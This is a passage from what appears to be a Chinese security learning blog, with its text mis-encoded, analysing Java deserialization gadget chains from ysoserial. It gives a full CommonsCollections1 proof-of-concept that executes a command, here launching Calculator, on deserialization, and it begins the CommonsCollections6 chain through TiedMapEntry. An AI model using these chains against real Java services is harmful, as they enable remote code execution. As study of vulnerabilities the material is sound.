<p>é€šè¿‡åŠ¨æ€ä»£ç†åŠ«æŒAnnotationInvocationHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡åå°„æœºåˆ¶ å®ä¾‹åŒ– AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶</span></span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//è·å–AnnotationInvocationHandlerç±»å®ä¾‹</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ¨æ€ä»£ç†åŠ«æŒ ï¼ˆProxy å®ç°äº†Serializableæ¥å£ æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼‰</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) instance;</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">	Map.class.getClassLoader(),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">	handler</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬ååºåˆ—åŒ–çš„å…¥å£ç‚¹æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject </code>,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>AnnotationInvocationHandler</code>å¯¹è¿™ä¸ª<code>proxyMap</code>è¿›è¡ŒåŒ…è£¹:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span>  ctor.newInstance(Target.class, proxyMap);</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/10 23:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ysoserial</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Yso</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä¸ç”¨å†æ·»åŠ valueäº†</span></span><br><span class="line">        <span class="comment">// innerMap.put(&quot;value&quot;, &quot;value&quot;);</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨ LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„æœºåˆ¶ å®ä¾‹åŒ– AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//è·å–AnnotationInvocationHandlerç±»å®ä¾‹</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ¨æ€ä»£ç†åŠ«æŒ ï¼ˆProxy å®ç°äº†Serializableæ¥å£ æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼‰</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) instance;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span>  ctor.newInstance(Target.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payloadproxy.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payloadproxy.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="comment">//æœåŠ¡ç«¯ååºåˆ—åŒ–</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‰§è¡Œå‘½ä»¤<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110313.png" alt="image-20210611095342352"></p>
<h3 id="5-4-å…¶å®ƒ"><a href="#5-4-å…¶å®ƒ" class="headerlink" title="5.4 å…¶å®ƒ"></a>5.4 å…¶å®ƒ</h3><p>æœ‰æ—¶å€™è°ƒè¯•ä¸Šè¿°POCçš„æ—¶å€™ï¼Œä¼šå‘ç°å¼¹å‡ºäº†ä¸¤ä¸ªè®¡ç®—å™¨ï¼Œæˆ–è€…æ²¡æœ‰æ‰§è¡Œåˆ°readObjectçš„æ—¶å€™å°±å¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œè¿™æ˜¯ç”±äºIDEAä¸­Debugå°±åˆ©ç”¨toStringï¼Œåœ¨è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ä»£ç†ç±»çš„toStringæ–¹æ³•ä»è€Œé€ æˆéé¢„æœŸçš„å‘½ä»¤æ‰§è¡Œ(åœ¨ä½¿ç”¨Proxyä»£ç†äº†mapå¯¹è±¡åï¼Œæˆ‘ä»¬åœ¨ä»»ä½•åœ°æ–¹æ‰§è¡Œmapçš„æ–¹æ³•å°±ä¼šè§¦å‘Payloadå¼¹å‡ºè®¡ç®—å™¨ï¼Œ)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110259.png" alt="image-20210611100555230"></p>
<p>ysoserialä¸­å¯¹æ­¤ä¹Ÿæœ‰ä¸€äº›å¤„ç†ï¼Œå®ƒåœ¨POCçš„æœ€åæ‰å°†æ‰§è¡Œå‘½ä»¤çš„Transformeræ•°ç»„è®¾ç½®åˆ°transformerChain ä¸­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ysoserialåœ¨transformæ•°ç»„ä¸­å¤šäº†ä¸€ä¸ªå…ƒç´ <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110254.png" alt="image-20210611102209671"></p>
<p>Pç‰›çŒœæµ‹æ˜¯ä¸ºäº†éšè—æŠ¥é”™ä¿¡æ¯ï¼Œåœ¨ä¸Šè¿°æ‰§è¡Œå‘½ä»¤æˆåŠŸåï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€æ¡æŠ¥é”™ä¿¡æ¯ï¼Œå†åŠ å…¥è¿™ä¸ªå…ƒç´ åï¼Œéšè”½äº†å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210611110306.png" alt="image-20210611102415982"></p>
<p>ç»è¿‡æµ‹è¯•ï¼Œ<strong>LazyMap</strong>ä¸<strong>TransformedMap</strong>éƒ½ä¸èƒ½åœ¨é«˜ç‰ˆæœ¬Javaï¼ˆ8u71ï¼‰ä¹‹ååˆ©ç”¨ï¼Œè‡³äºå¦‚ä½•è§£å†³é‚£æ˜¯å¦ä¸€æ¡CommonCollectionsåˆ©ç”¨é“¾çš„å­¦ä¹ äº†ï¼ˆCommonCollections6ï¼‰ã€‚</p>
<p>ä¸Šè¿°åˆ†æè¿‡ç¨‹ç”¨åˆ°çš„ä»£ç éƒ½å·²ä¸Šä¼ åˆ° <a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
<h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><p><a href="https://www.gettoby.com/p/0h2v47vgjznb">https://www.gettoby.com/p/0h2v47vgjznb</a></p>
<p>Pç‰›çŸ¥è¯†æ˜Ÿçƒ-javaå®‰å…¨æ¼«è°ˆ</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserialå­¦ä¹ ä¹‹CommonsCollections6(ä¸‰)</title>
    <url>/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/</url>
    <content><![CDATA[<blockquote>
<p>  äº‰å–æ˜å¹´æœ‰ä¸€ä¸ªä¸Šåƒstarçš„é¡¹ç›®</p>
</blockquote>
<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨ä¸Šä¸€ç¯‡é€šè¿‡ Pç‰›å’Œ ysoserial é¡¹ç›®åˆ†æäº†CommonsCollections1è¿™æ¡åˆ©ç”¨é“¾å’Œå…¶ä¸­çš„TransformedMapã€LazyMapåŸç†ã€‚</p>
<p>ä½†æ˜¯åœ¨ Java 8u71ä»¥åï¼Œè¿™ä¸ªåˆ©ç”¨é“¾ä¸èƒ½å†åˆ©ç”¨äº†ï¼Œä¸»è¦åŸå› æ˜¯ <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> çš„é€»è¾‘å˜åŒ–äº†ã€‚</p>
<p>CommonsCollections6 è§£å†³äº†é«˜ç‰ˆæœ¬Javaçš„åˆ©ç”¨é—®é¢˜ï¼Œä¸€èµ·æ¥å­¦ä¹ ä¸‹å§ã€‚</p>
<p>æœ¬æ–‡CommonsCollections6åˆ©ç”¨é“¾çš„é™åˆ¶æ¡ä»¶ï¼š</p>
<p>â€‹	JDKç‰ˆæœ¬ï¼šæš‚æ— é™åˆ¶ã€ CommonsCollections 3.1 - 3.2.1</p>
<p>å®éªŒç¯å¢ƒ:</p>
<p>â€‹	JDK 1.8.0_261 ã€Commons-Collections 3.2.1 </p>
<h2 id="0x01-AnnotationInvocationHandler-readObject"><a href="#0x01-AnnotationInvocationHandler-readObject" class="headerlink" title="0x01 AnnotationInvocationHandler#readObject"></a>0x01 AnnotationInvocationHandler#readObject</h2><p>å­¦ä¹  CommonsCollections6 ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ <code>AnnotationInvocationHandler#readObject</code>å…·ä½“æ”¹å˜äº†ä»€ä¹ˆ?</p>
<p>åœ¨ Java 8u71 ä¹‹å‰ï¼Œå½“ <code>Object var6 = this.memberValues.get(var4);</code> var4 çš„å€¼ä¸º<code>entrySet</code>æ—¶ï¼Œè¿™æ—¶ <code>this.memberValues</code> æ˜¯ä¸€ä¸ª<code>LazyMap</code>å¯¹è±¡ï¼Œé‡Œé¢çš„å€¼ä¹Ÿå°±æ˜¯åœ¨ä¸Šä¸€èŠ‚æˆ‘ä»¬æ„é€ å¥½çš„transformersçš„æ•°ç»„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215158.png" alt="image-20210627131532093"></p>
<p>åªæœ‰è¿™æ—¶æ‰ä¼šç»§ç»­æ‰§è¡Œ<code>LazyMap#get</code>æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘<code>transform</code>æ–¹æ³•ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215208.png" alt="image-20210627130306085"></p>
<p>è€Œåœ¨ Java 8u71 ä¹‹åï¼ˆæœ¬æ–‡ä»¥JDK 1.8.0_261ä¸ºä¾‹ï¼‰ï¼Œå½“ <code>Object var6 = this.memberValues.get(var4);</code> var4 çš„å€¼ä¸º<code>entrySet</code>æ—¶ï¼Œè¿™æ—¶ <code>this.memberValues</code> å´æ˜¯ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œæ ¹æœ¬ä¸æ˜¯æˆ‘ä»¬æ„é€ çš„ <code>LazyMap</code> <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215214.png" alt="image-20210627132502384"></p>
<p>ä¸»è¦å°±æ˜¯å› ä¸ºåœ¨Java 8u71ä¹‹å‰çš„<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>ä¸­ï¼Œé¦–å…ˆè°ƒç”¨é»˜è®¤çš„ååºåˆ—åŒ–æ–¹æ³•<code>defaultReadObject</code>è·å–Mapå¯¹è±¡ï¼›</p>
<p>è€Œ Java 8u71ä¹‹åï¼Œä¿®æ”¹äº†é€»è¾‘ï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215221.png" alt="image-20210627134340813"></p>
<p><code>LinkedHashMap</code>æ— æ³•è·å¾—<code>entrySet</code>çš„å†…å®¹ï¼Œæ‰€ä»¥å½“ <code>Object var6 = this.memberValues.get(var4);</code> var4 çš„å€¼ä¸º<code>entrySet</code>æ—¶ï¼Œä¼šæŠ¥ä¸‹é¢è¿™ä¸ªé”™è¯¯ï¼Œæ— æ³•å®Œæˆåç»­æ“ä½œã€‚</p>
<p><code>java.lang.annotation.Target missing element entrySet</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215227.png" alt="image-20210627134652820"></p>
<h2 id="0x02-åˆ©ç”¨é“¾"><a href="#0x02-åˆ©ç”¨é“¾" class="headerlink" title="0x02 åˆ©ç”¨é“¾"></a>0x02 åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ååŠæ®µä»<code>LazyMap.get()</code>åˆ°ç»“æŸéƒ½å’ŒCC1ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œå…·ä½“å¯ä»¥çœ‹ä¸Šç¯‡æ–‡ç« **<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserialå­¦ä¹ ä¹‹CommonsCollections1(äºŒ)</a>**ã€‚</p>
<p><code>AnnotationInvocationHandler</code>åœ¨å‰é¢èµ·åˆ°çš„ä½œç”¨æ˜¯æ¥è§¦å‘<code>LazyMap#get</code>å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡æ»¡è¶³</p>
<ul>
<li><p>ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªå¯æ§çš„Mapå¯¹è±¡æˆ–Object</p>
</li>
<li><p>è¯¥ç±»çš„ç±»å‡½æ•°ä¸Šæœ‰è°ƒç”¨è¿™ä¸ªMap.getçš„åœ°æ–¹</p>
</li>
</ul>
<p>ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°è§£å†³<strong>Javaé«˜ç‰ˆæœ¬åˆ©ç”¨</strong>é—®é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰¾æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒç”¨ <strong>LazyMap#get()</strong> çš„åœ°æ–¹ã€‚</p>
<h3 id="2-1-TiedMapEntry"><a href="#2-1-TiedMapEntry" class="headerlink" title="2.1 TiedMapEntry"></a>2.1 TiedMapEntry</h3><p>åœ¨ ysoserial é¡¹ç›®ä¸­çš„ CC6é“¾ æ˜¯æ‰¾äº†<strong>TiedMapEntry</strong>ç±»æ¥ä»£æ›¿<strong>AnnotationInvocationHandler</strong>çš„ä½œç”¨ã€‚</p>
<p>ç›´æ¥è¿›å…¥<code> org.apache.commons.collections.keyvalue.TiedMapEntry</code>æ–‡ä»¶ä¸­, <code>TiedMapEntry</code>å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œå¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œå¾ˆå¥½ï¼Œæ„é€ æ–¹æ³•æ¥å—ä¸€ä¸ªMapï¼Œå¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†<code>LazyMap</code>å¯¹è±¡æ”¾å…¥ï¼Œ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215234.png" alt="image-20210627162448731"></p>
<p>åœ¨<code>TiedMapEntry#getValue</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>map.get</code>æ–¹æ³•ï¼Œå¯ä»¥æ‰§è¡Œ<code>LazyMap.get</code>ï¼Œè¿›è€Œæ‰§è¡Œ<code>transform</code>æ–¹æ³•ï¼Œæ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œå®Œç¾ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215239.png" alt="image-20210627162759746"></p>
<p>æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// éšè—é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸Šé¢è¿˜æ˜¯ä½¿ç”¨CC1æ„é€ çš„ï¼Œä¸å˜ï¼Œ è¿™é‡Œåˆ›å»º TiedMapEntry æµ‹è¯•ä¸€ä¸‹</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215244.png" alt="image-20210627163526597"></p>
<h3 id="2-2-HashMap"><a href="#2-2-HashMap" class="headerlink" title="2.2 HashMap"></a>2.2 HashMap</h3><p>ä¸‹é¢å°±æ˜¯æ‰¾ä¸€ä¸ªèƒ½è‡ªåŠ¨è°ƒç”¨ <code>TiedMapEntry#getValue</code>çš„åœ°æ–¹äº†ã€‚</p>
